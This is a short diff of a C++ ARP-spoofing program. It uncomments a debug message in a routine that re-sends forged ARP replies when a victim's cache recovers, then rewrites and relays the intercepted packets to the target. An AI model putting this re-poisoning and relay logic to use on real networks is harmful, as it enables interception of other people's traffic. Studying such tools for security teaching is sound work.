@@ -115,7 +115,7 @@ void check_infected(pcap_t* handle, Mac smac, Ip sip, Mac tmac, Ip tip, Mac atta
             printf("the packet is recovered. Let's attack again!!\n");
             send_packet(handle, smac, attacker_mac, htons(ArpHdr::Reply),attacker_mac, htonl(tip), smac, htonl(sip));
         }else if(ethip->eth_.type() != EthHdr::Ip4 && ethip->eth_.smac()!=smac && ethip->ip_.ip_dst!=tip){
-            //printf("catch sender's packet well. let's relay!\n");
+            printf("catch sender's packet well. let's relay!\n");
             ethip->eth_.smac_ = attacker_mac;
             ethip->eth_.dmac_ = tmac;
             int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthIpPacket));
